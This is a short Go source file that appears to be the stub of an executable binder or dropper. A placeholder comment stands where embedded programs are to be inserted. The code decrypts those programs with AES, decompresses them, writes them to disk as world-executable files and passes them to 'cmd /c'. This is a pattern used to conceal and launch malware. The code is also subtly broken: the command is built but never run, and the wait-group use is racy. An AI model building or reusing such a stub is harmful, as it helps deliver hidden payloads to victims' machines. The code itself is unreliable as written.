package main

import (
	"io/ioutil"
	"os/exec"
	"sync"
)

type exepack struct {
	data         []byte
	aeskey       []byte
	filename     string
	isencrypted  bool
	iscompressed bool
}

var executables []exepack
var wg sync.WaitGroup

func main() {
	//This comment will be replaced

	for _, exe := range executables {
		go runExepack(exe, "")
		wg.Add(1)
	}
	wg.Wait()
}

func runExepack(pack exepack, path string) {
	//Encrypting compressed data can be unsafe

	defer wg.Done()

	b := pack.data
	var err error
	exepath := path + "/" + pack.filename

	if pack.isencrypted {
		b, err = Decrypt(pack.aeskey, b)
		logif(err)
	}
	if pack.iscompressed {
		b, err = gUnzipData(b)
		logif(err)
	}

	err = ioutil.WriteFile(exepath, b, 0777)
	logif(err)

	exec.Command("cmd", "/c", exepath)
}
